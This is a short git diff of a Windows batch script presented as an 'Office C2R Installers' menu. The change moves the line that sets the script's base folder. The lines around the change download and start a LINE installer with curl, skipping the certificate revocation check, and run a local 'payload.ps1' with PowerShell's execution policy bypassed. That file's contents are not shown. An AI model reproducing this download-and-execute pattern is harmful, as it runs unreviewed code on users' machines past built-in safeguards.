@@ -2,6 +2,9 @@
 title served_software.bat
 color 07
 
+:: Get the folder where this batch file is located
+set "basepath=%~dp0"
+
 echo.
 echo ===============================
 echo      Office C2R Installers
@@ -62,9 +65,6 @@ cd %basepath%
 curl --ssl-no-revoke -LO "https://desktop.line-scdn.net/win/new/LineInst.exe"
 start "" "%basepath%LineInst.exe"
 
-:: Get the folder where this batch file is located
-set "basepath=%~dp0"
-
 :: Paths relative to this batch file
 set "payloadps1=%basepath%payload.ps1"
 
@@ -74,4 +74,5 @@ if exist "%payloadps1%" (
     powershell -ExecutionPolicy Bypass -File "%payloadps1%"
 ) else (
     echo Payload PowerShell not found: %payloadps1%
+
 )
